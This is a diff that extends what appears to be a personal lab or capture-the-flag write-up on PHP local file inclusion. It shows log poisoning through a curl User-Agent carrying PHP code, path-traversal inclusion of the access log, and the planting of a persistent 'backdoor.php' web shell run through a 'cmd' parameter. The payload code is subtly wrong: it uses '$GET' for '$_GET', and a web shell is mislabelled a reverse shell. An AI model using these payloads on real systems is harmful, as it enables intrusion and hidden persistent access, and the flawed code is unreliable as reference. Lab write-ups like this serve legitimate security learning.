@@ -277,4 +277,62 @@ curl -A "This is testing" <SERVER>/login.php
 curl -A "<?php phpinfo();?>" <SERVER>/login.php
 ```
 
+![[Pasted image 20240716082533.png]]
+
+Now we need to get to our file so we open a new private window so our user is no longer logged in and go back to the `err= error page`
+
+Now we need to do some LFI to get to the file and we should see the output for phpinfo:
+
+![[Pasted image 20240716083244.png]]
+
+**Linux lfi-aoc-awesome-59aedca683fff9261263bb084880c965**
+
 _Bonus: The current PHP configuration stores the PHP session files in /tmp. Use the LFI to call the PHP session file to get your PHP code executed.
+
+## First Backdoor
+
+Reverse Shell:
+
+```php
+curl -A "<?php echo 'ayylmao    ';system(\$GET['cmd']);?>" <SERVER>/index.php
+```
+
+LFI:
+
+```php
+<SERVER_IP>/index.php?err=../../../../var/www/html/includes/logs/app_access.log
+```
+
+_Error: Cannot execute a blank command in var/www/html/includes/logs/app_access.log_
+
+**The error just means it doesn't know how to render it**
+
+We should now have code execution. We can check by using this command:
+
+```php
+<SERVER_IP>/index.php?err=../../../../var/www/html/includes/logs/app_access.log&cmd=whoami
+```
+
+## Second Backdoor
+
+We can use the first backdoor to create a file that runs the same script:
+
+```php
+<SERVER_IP>/index.php?err=../../../../var/www/html/includes/logs/app_access.log&cmd=echo '<?php echo 'ayylmao    ';system(\$GET['cmd']);?>' > backdoor.php
+```
+
+Navigate to file:
+
+```php
+<SERVER_IP>/backdoor.php
+```
+
+Useage:
+
+```php
+<SERVER_IP>/backdoor.php?cmd=whoami
+```
+
+We could now use this to get a full reverse shell and get onto the machine, but i think we'll leave it there.
+
+**Completed:** 08:53 2024-07-16
